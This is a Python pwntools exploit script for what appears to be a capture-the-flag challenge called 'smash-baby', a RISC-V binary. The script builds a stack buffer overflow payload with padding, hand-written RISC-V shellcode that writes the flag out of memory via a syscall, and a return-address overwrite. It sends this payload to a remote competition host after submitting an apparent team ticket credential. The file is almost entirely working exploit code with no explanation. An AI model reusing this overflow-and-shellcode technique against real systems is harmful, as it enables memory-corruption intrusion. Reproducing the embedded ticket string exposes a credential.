#!/usr/bin/env python3
from pwn import *


exe = './smash-baby'
context.update(arch="riscv", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

rem = True

# print(p.recvuntil(b"me!\n"))

if rem == True:
	p = remote("riscv_smash.quals2023-kah5Aiv9.satellitesabove.me", 5300)
	leak = 0x40800cfc-32
else:
	p = process("qemu-riscv32 -E FLAG=AAAAAAAA -g 6969 ./smash-baby", shell=True)
	q = process("xfce4-terminal --title=GDB-Pwn -x gdb-multiarch ./smash-baby -ex 'source /home/tourpran/pwndbg/gdbinit.py' -ex 'target remote localhost:6969' -ex 'b* 0x000106a6' -ex 'c'", shell=True)
	leak = 0x408000ac-32

flag = leak + 728
shellcode = leak - 84+4

'''
a0 = 1 stdout
a1 = address of flag
a2 = length of buffer
a7 = 64

'''

shell = """
	addi a1, ra, 812
	li a7, 64
	li a2, 800
	li a0, 1
    ecall
"""
if(rem == True):
	p.sendline(b"ticket{romeo176542india4:GO7ad_infRCOaKDaZ1PD24oAJiWZ1_8YqA3XHYyKIKnd-Orph15tNuleiHnK4JQ9zg}")
p.recvuntil(b"me!\n")
# pause()
p.sendline(b"A"*398 + b"CEG" + b"BB" + asm(shell) + b"\x90"*(36-len(asm(shell))) + p64(shellcode))

p.interactive()
